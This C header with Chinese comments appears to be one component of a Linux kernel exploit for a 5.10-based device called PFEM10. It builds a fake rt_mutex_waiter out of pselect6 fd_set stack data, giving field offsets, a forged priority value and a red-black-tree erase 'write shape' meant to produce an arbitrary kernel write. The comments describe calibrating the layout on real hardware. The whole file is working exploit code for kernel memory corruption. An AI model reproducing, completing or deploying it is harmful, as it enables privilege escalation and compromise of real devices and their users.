/* ============================================================================
 * fdset_map.h — fd_set 词表 → fd 位图映射（slide.c / fops.c 移植, PFEM10 5.10）
 * ============================================================================
 * 用途: 把 IonStack slide.c / fops.c 的 pselect fd_set 词表映射逻辑移植到
 *       PFEM10 compact rt_mutex_waiter。宿主(pfem10-spray 探针)与设备
 *       (v8 探针集成) 共用同一套映射, 消除"词表与结构体偏移错位"这一类错误。
 *
 * ★ 映射规则（slide.c 同款, 已用 v8 探针真机实证校准）:
 *   - pselect6(nfds, in, out, ex, ...) 在 kernel 侧把每个 fd_set 前
 *     FDS_BYTES(nfds) 字节逐字拷入 core_sys_select 的连续 buffer:
 *       in@+0 / out@+size / ex@+2*size / res_in@+3*size / ...   (size = wps*8)
 *     用户态 in/out/ex 是栈上连续局部变量 → 假 waiter 区 = in|out|ex 的字网格。
 *   - 全局词 g ↔ (set, word):  set = g / wps, word = g % wps, 偏移 = g*8
 *     (wps = words_per_set = ceil(nfds/64); nfds=320 → wps=5)
 *   - 假 waiter 第 w 个字段(word w) → 全局词 g = shift + w。
 *     shift(δ) 是逐调用路径的栈对齐校准值: PFEM10 v8 reclaim 路径 oracle 定案 δ=0;
 *     tokay 6.1 route=1 / slide=0（逐路径实测）。环境 PFEM10_PSELECT_SHIFT 可覆盖。
 *   - 紧凑 rt_mutex_waiter (5.10, 0x50 字节) 的字段→word 表见 fdsetm_compact_words[],
 *     字段偏移 = word*8（compact 无 wake_state/ww_ctx, ex 词不参与）。
 *
 * ★ PFEM10 v8 真机实证的词表（oracle 定案, trigger_reclaim_v8.c）:
 *     tree.pc@+0x00=in[0]  tree.right@+0x08=in[1]=0  tree.left@+0x10=in[2]
 *     task@+0x30=out[1]    lock@+0x38=out[2]         prio@+0x40=out[3]=130
 *     deadline@+0x48=out[4]=0   (in@+0/out@+0x28, δ=0)
 *
 * ★ 写形状（[7] __rb_erase_augmented Case 1-left）:
 *     *(tree.left) = tree.pc  →  in[2]=写目标, in[0]=写值(8 对齐, bit0=0)
 *     副作用 __rb_change_child: *(写值&~3 + 0x08/0x10) = 写目标
 * ============================================================================
 */
#ifndef PFEM10_FDSET_MAP_H
#define PFEM10_FDSET_MAP_H

#include <stdint.h>
#include <string.h>

/* ------------------------- 映射参数 ------------------------- */
#define PFEM10_PSELECT_NFDS          320        /* v8 实证 (RECLAIM_NFDS) */
#define PFEM10_PSELECT_BITS_PER_WORD 64
#define PFEM10_PSELECT_SHIFT_DEFAULT 0          /* v8 oracle 定案 δ=0 */
#define PFEM10_PSELECT_MAX_WORDS     8          /* 网格容量 (nfds≤512) */

#define PFEM10_WAITER_TREE_PC_OFF    0x00
#define PFEM10_WAITER_TREE_RIGHT_OFF 0x08
#define PFEM10_WAITER_TREE_LEFT_OFF  0x10
#define PFEM10_WAITER_PI_PC_OFF      0x18
#define PFEM10_WAITER_PI_RIGHT_OFF   0x20
#define PFEM10_WAITER_PI_LEFT_OFF    0x28
#define PFEM10_WAITER_TASK_OFF       0x30
#define PFEM10_WAITER_LOCK_OFF       0x38
#define PFEM10_WAITER_PRIO_OFF       0x40   /* u32 */
#define PFEM10_WAITER_DEADLINE_OFF   0x48   /* u64 */
#define PFEM10_WAITER_SIZE           0x50

#define PFEM10_FAKE_WAITER_PRIO      130    /* ≠ W prio(120) → [3] requeue=1 */
#define PFEM10_FAKE_TASK_PRIO        120

/* ------------------------- 词网格 ------------------------- */
typedef struct {
    uint64_t set[3][PFEM10_PSELECT_MAX_WORDS]; /* in/out/ex */
    int nfds;
    int wps;
    int shift;
} fdsetm_grid_t;

static inline int fdsetm_words_per_set(int nfds)
{
    return (nfds + PFEM10_PSELECT_BITS_PER_WORD - 1)
           / PFEM10_PSELECT_BITS_PER_WORD;
}

static inline void fdsetm_grid_init(fdsetm_grid_t *g, int nfds, int shift)
{
    memset(g, 0, sizeof(*g));
    g->nfds  = nfds;
    g->wps   = fdsetm_words_per_set(nfds);
    g->shift = shift;
}

/* 全局词 → (set, word)。返回 0 表示越界（不可放置）。 */
static inline int fdsetm_global_place(int g, int wps, int *set_idx, int *word_idx)
{
    if (g < 0) return 0;
    *set_idx  = g / wps;
    *word_idx = g % wps;
    return *set_idx < 3;
}

static inline void fdsetm_put_global(fdsetm_grid_t *g, int global_word, uint64_t value)
{
    int si, wi;
    if (!fdsetm_global_place(global_word, g->wps, &si, &wi)) return;
    g->set[si][wi] = value;
}

static inline uint64_t fdsetm_get_global(const fdsetm_grid_t *g, int global_word)
{
    int si, wi;
    if (!fdsetm_global_place(global_word, g->wps, &si, &wi)) return 0;
    return g->set[si][wi];
}

/* waiter_word（结构体偏移/8）→ 全局词 → (set, word) */
static inline int fdsetm_waiter_place(const fdsetm_grid_t *g, int waiter_word,
                                      int *set_idx, int *word_idx)
{
    return fdsetm_global_place(g->shift + waiter_word, g->wps, set_idx, word_idx);
}

static inline void fdsetm_put_waiter(fdsetm_grid_t *g, int waiter_word, uint64_t value)
{
    int si, wi;
    if (!fdsetm_waiter_place(g, waiter_word, &si, &wi)) return;
    g->set[si][wi] = value;
}

static inline uint64_t fdsetm_get_waiter(const fdsetm_grid_t *g, int waiter_word)
{
    int si, wi;
    if (!fdsetm_waiter_place(g, waiter_word, &si, &wi)) return 0;
    return g->set[si][wi];
}

/* ------------------------- 紧凑假 waiter 词表 ------------------------- */
/* word = 结构体偏移/8; 值由写形状注入。tree.pc/right 必须 in[0]=写值/in[1]=0。 */
typedef struct {
    int      word;
    const char *name;
    uint64_t value;
} fdsetm_waiter_word_t;

static const fdsetm_waiter_word_t fdsetm_compact_words[] = {
    { PFEM10_WAITER_TREE_PC_OFF    / 8, "tree.pc",    0 },  /* in[0]  写值 */
    { PFEM10_WAITER_TREE_RIGHT_OFF / 8, "tree.right", 0 },  /* in[1]  必须 0 (Case 1-left) */
    { PFEM10_WAITER_TREE_LEFT_OFF  / 8, "tree.left",  0 },  /* in[2]  写目标 */
    { PFEM10_WAITER_PI_PC_OFF      / 8, "pi.pc",      0 },  /* in[3] */
    { PFEM10_WAITER_PI_RIGHT_OFF   / 8, "pi.right",   0 },  /* in[4] */
    { PFEM10_WAITER_PI_LEFT_OFF    / 8, "pi.left",    0 },  /* out[0] */
    { PFEM10_WAITER_TASK_OFF       / 8, "task",       0 },  /* out[1] */
    { PFEM10_WAITER_LOCK_OFF       / 8, "lock",       0 },  /* out[2] */
    { PFEM10_WAITER_PRIO_OFF       / 8, "prio",       0 },  /* out[3] 130 */
    { PFEM10_WAITER_DEADLINE_OFF   / 8, "deadline",   0 },  /* out[4] */
};
#define FDSetM_COMPACT_WORDS_N \
    (sizeof(fdsetm_compact_words) / sizeof(fdsetm_compact_words[0]))

/* 写形状: 决定 in[0]/in[2]/out[1]/out[2]/out[3] 的取值 */
typedef struct {
    uint64_t write_value;    /* in[0] tree.pc  （8 对齐, bit0=0） */
    uint64_t write_target;   /* in[2] tree.left */
    uint64_t waiter_task;    /* out[1] task    （fake_task 或 init_task 别名） */
    uint64_t waiter_lock;    /* out[2] lock    （fake_lock 堆锚点） */
    uint32_t waiter_prio;    /* out[3] prio    （130 → [3] requeue） */
} fdsetm_write_shape_t;

/* 按词表 + 写形状构建网格 */
static inline void fdsetm_build(fdsetm_grid_t *g, int nfds, int shift,
                                const fdsetm_write_shape_t *s)
{
    fdsetm_grid_init(g, nfds, shift);
    for (size_t i = 0; i < FDSetM_COMPACT_WORDS_N; i++) {
        const fdsetm_waiter_word_t *w = &fdsetm_compact_words[i];
        uint64_t v = w->value;
        switch (w->word) {
            case PFEM10_WAITER_TREE_PC_OFF / 8: v = s->write_value;  break;
            case PFEM10_WAITER_TREE_LEFT_OFF / 8: v = s->write_target; break;
            case PFEM10_WAITER_TASK_OFF / 8:    v = s->waiter_task;  break;
            case PFEM10_WAITER_LOCK_OFF / 8:    v = s->waiter_lock;  break;
            case PFEM10_WAITER_PRIO_OFF / 8:    v = s->waiter_prio;  break;
            default: break;
        }
        fdsetm_put_waiter(g, w->word, v);
    }
}

#endif /* PFEM10_FDSET_MAP_H */
